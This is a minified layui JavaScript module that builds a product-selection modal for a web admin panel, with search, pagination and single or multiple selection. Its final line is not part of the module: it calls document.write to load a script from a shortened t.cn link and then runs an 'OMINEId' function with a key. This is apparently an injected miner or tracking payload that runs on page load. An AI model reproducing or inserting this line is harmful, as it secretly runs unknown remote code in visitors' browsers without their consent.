"use strict";layui.define(["layer","table","form","laypage"],function(e){var n,o,s=layui.layer,i=layui.table,a=layui.form,t=layui.laypage,d=!1,r={},p=!1,u=[],l=function(e,t){o&&("string"==typeof o?e.is_open=1:e=$.extend(e,o)),r.Home&&(e=$.extend(e,{Home:"home"})),0<u.length?t(n=u):$.get("/Admin/Product/productList",e,function(e){0===(e=$.parseJSON(e)).error?(n=e.data,t(e.data)):s.tips(e.msg,".modal-search-btn")})},m=function(e){var t=[{field:"checkbox",width:60,fixed:"left",templet:function(){return p?'<div ><input class="select-modal-checkbox" lay-filter="p_check" type="checkbox" name="" lay-skin="primary"></div>':'<div class="layui-form-item">\n    <div class="layui-input-block" style="margin-left:0">\n      <input class="select-modal-checkbox" lay-filter="p_check" type="radio" name="p_check" lay-skin="primary">\n    </div>\n  </div>'}},{field:"id",title:"id",width:80},{field:"p_sign",title:"型号",width:160},{field:"fitemno",title:"ERP型号",width:160},{field:"package",title:"封装",width:100},{field:"brand_name",title:"品牌",width:100},{field:"cate_name",title:"分类",width:136,align:"center"}];d&&t.splice(3,1),i.render({elem:".select-modal-table",data:e.list?e.list:e,page:!1,limit:e.pageSize||10,cellMinWidth:160,height:"320",cols:[t]}),a.on("checkbox(p_check)",function(e){var t=$(".select-modal-checkbox");p?$(e.elem).prop("checked")?$(e.elem).prop("checked",!0):$(e.elem).prop("checked",!1):(t.each(function(){$(this).prop("checked",!1)}),$(e.elem).prop("checked",!0)),a.render("checkbox","p_check")})},h=function(a){t.render({elem:$(".layui-layer-content").find(".select-modal-page")[0],limit:a.pageSize||10,count:a.count?a.count.count:10,curr:a.page||1,layout:["prev","page","next"],jump:function(e,t){var i=$(".modal-search-input").val().trim();t||l({page:e.curr,pageSize:a.pageSize,p_sign:i||""},function(e){m(e)})}})};e("selectProduct",{start:function(c,e){s.open({title:"选择商品",type:0,skin:e.skin?e.skin:"",area:["640px","60vh"],content:'<div class="select-modal-container layui-form"> <div class="select-modal-box"> <div class="select-search-container"><input class="layui-input modal-search-input" type="text" placeholder="输入商品型号检索"><div class="layui-btn-group" style="margin-top:-4px"> <button class="layui-btn modal-search-btn">搜索</button> <button class="layui-btn layui-btn-primary modal-clear-btn">清空</button> </div></div><table lay-filter="select-modal-table" class="select-modal-table"></table> <div class="select-modal-page"></div> </div> </div>',success:function(){$(".layui-input.modal-search-input").focus(),e.css_fn&&e.css_fn(),$(".modal-search-btn").click(function(){var e={},t=$(".modal-search-input").val().trim();u=[],t&&(e.p_sign=t),l(e,function(e){m(e),h(e)})}),$(".modal-clear-btn").on("click",function(){$(".modal-search-input").val(""),u=[],l({},function(e){m(e),h(e)})}),l({},function(e){m(e),h(e)})},yes:function(e,t){var i=$(".layui-layer-content .select-modal-checkbox:checked");if(i.length){if(p){var a=[];i.each(function(e,t){var i=$(t).parents("tr").index();a.push(n.list?n.list[i]:n[i])})}else{var l=i.parents("tr").index();a=n.list?n.list[l]:n[l]}c(a),s.close(e)}else s.tips("请勾选需要操作的数据",".layui-layer-btn0")}})},initInput:function(e,i,a,t,l){var c=this;t&&(o=t),e=e||".jl-select-product",a=a||"p_sign",l&&(p=!!l.checkBox&&l.checkBox,d=l.emptyErp||!1,r=l),$(e).click(function(){var t=$(this),e=t.data("data")?decodeURIComponent(t.data("data")):"";e&&(u=[].concat(JSON.parse(e))),c.start(function(e){t.val(e[a]),t.siblings("input")&&t.siblings("input").val(e.id),t.data("id",e.id),i&&i(e,t)},l||{})})}})});
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
